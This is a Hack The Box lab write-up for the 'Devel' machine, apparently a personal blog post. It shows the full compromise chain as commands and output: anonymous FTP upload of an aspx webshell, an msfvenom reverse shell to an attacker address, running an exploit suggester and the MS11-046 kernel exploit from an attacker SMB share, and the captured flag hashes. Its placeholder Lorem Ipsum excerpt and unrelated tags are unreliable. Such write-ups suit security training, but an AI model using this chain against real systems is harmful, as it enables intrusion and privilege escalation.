---
layout: single
title: Devel - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-devel/devel_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-devel/devel_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/devel]# nmap -Pn -n -sCV 10.10.10.5 --open                                                                         (master✱)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 03-18-17  01:06AM       <DIR>          aspnet_client
    | 03-17-17  04:37PM                  689 iisstart.htm
    |_03-17-17  04:37PM               184946 welcome.png
    | ftp-syst:
    |_  SYST: Windows_NT
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: IIS7
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

   DIRB:
   ==> DIRECTORY: http://10.10.10.5/aspnet_client/

   NIKTO:
   + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST


2. The FTP server is open for anonymous login, let see what we can do there.

  [root:/git/htb/devel]# ftp  10.10.10.5                                                                                            (master✱)
    Connected to 10.10.10.5.
    220 Microsoft FTP Service
    Name (10.10.10.5:root): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> ?
      Commands may be abbreviated.  Commands are:

      !		dir		mdelete		qc		site
      $		disconnect	mdir		sendport	size
      account		exit		mget		put		status
      append		form		mkdir		pwd		struct
      ascii		get		mls		quit		system
      bell		glob		mode		quote		sunique
      binary		hash		modtime		recv		tenex
      bye		help		mput		reget		tick
      case		idle		newer		rstatus		trace
      cd		image		nmap		rhelp		type
      cdup		ipany		nlist		rename		user
      chmod		ipv4		ntrans		reset		umask
      close		ipv6		open		restart		verbose
      cr		lcd		prompt		rmdir		?
      delete		ls		passive		runique
      debug		macdef		proxy		send

   We have the option to 'put' (upload) files to the ftp, and looking around it seems like we are in webroot.
   Lets upload a webshell and browse to it. Since it's not a .php-server, lets upload a .aspx-shell.

   ftp> put aspxshell.aspx
    local: aspxshell.aspx remote: aspxshell.aspx
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    226 Transfer complete.
    5273 bytes sent in 0.00 secs (22.0558 MB/s)

   Go to http://10.10.10.5/aspxshell.aspx to enumerate the box further.

   > whoami
     iis apppool\web


3. Instead of looking around in a webshell, lets create a reverse aspx payload and upload it to the box.

    [root:/git/htb/devel]# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4488 -f aspx > rev.aspx                      (master✱)
      [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
      [-] No arch selected, selecting arch: x86 from the payload
      No encoder specified, outputting raw payload
      Payload size: 324 bytes
      Final size of aspx file: 2721 bytes

   Browse to http://10.10.10.5/rev.aspx to trigger the rev-shell.

    [root:/git/htb/devel]# nc -lvnp 4488                                                                                              (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49158
      Microsoft Windows [Version 6.1.7600]
      Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

      c:\windows\system32\inetsrv>whoami
        iis apppool\web

  I can't find any vulnerabilities by just looking around. Watson is a Windows exploit suggester that we can run from a locally
  hosted SMB server. Download pre-compiled Watson and execute it on the victim, through your SMB-server.

  [root:/srv/pub-share]# service smbd start
  [root:/srv/pub-share]# cp /opt/winPE/binaries/watson/WatsonNet3.5AnyCPU.exe .

  c:\inetpub\wwwroot>\\10.10.14.10\pub-share\WatsonNet3.5AnyCPU.exe
      __    __      _
     / / /\ \ \__ _| |_ ___  ___  _ __
     \ \/  \/ / _` | __/ __|/ _ \| '_ \
      \  /\  / (_| | |_\__ \ (_) | | | |
       \/  \/ \__,_|\__|___/\___/|_| |_|

                               v0.1

                      Sherlock sucks...
                       @_RastaMouse

     [*] OS Build number: 7600
     [*] CPU Address Width: 32
     [*] Process IntPtr Size: 4
     [*] Using Windows path: C:\WINDOWS\System32

      [*] Appears vulnerable to MS10-073
       [>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
       [>] Exploit: https://www.exploit-db.com/exploits/36327/
       [>] Notes: None.

      [*] Appears vulnerable to MS10-092
       [>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
       [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
       [>] Notes: None.

      [*] Appears vulnerable to MS11-046
       [>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
       [>] Exploit: https://www.exploit-db.com/exploits/40564/
       [>] Notes: None.

      [*] Appears vulnerable to MS12-042
       [>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
       [>] Exploit: https://www.exploit-db.com/exploits/20861/
       [>] Notes: None.

      [*] Appears vulnerable to MS13-005
       [>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
       [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
       [>] Notes: None.

     [*] Finished. Found 5 vulns :)


4. We are presented with various vulnerabilities, MS11-046 sounds great as it "allows local users to elevate privileges" which is
   exatly what we want. Upload the malicious .exe to your local SMB server and execute it on the remove host.

   [root:/srv/pub-share]# cp /opt/windows-kernel-exploits/MS11-046/ms11-046.exe .
   [root:/srv/pub-share]# chmod +x ms11-046.exe

   c:\inetpub\wwwroot>\\10.10.14.10\pub-share\ms11-046.exe
    \\10.10.14.10\pub-share\ms11-046.exe

    c:\Windows\System32>whoami
      nt authority\system

    C:\Users\babis\Desktop>type user.txt.txt
      9ecdd6a3aedf24b41562fea70f4cb3e8

    C:\Users\Administrator\Desktop>type root.txt
      e621a0b5041708797c4fc4728bc72b4b


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Pre-compiled Watson Binaries:
  https://github.com/carlospolop/winPE

Windows Kernel Exploits:
  https://github.com/SecWiki/windows-kernel-exploits
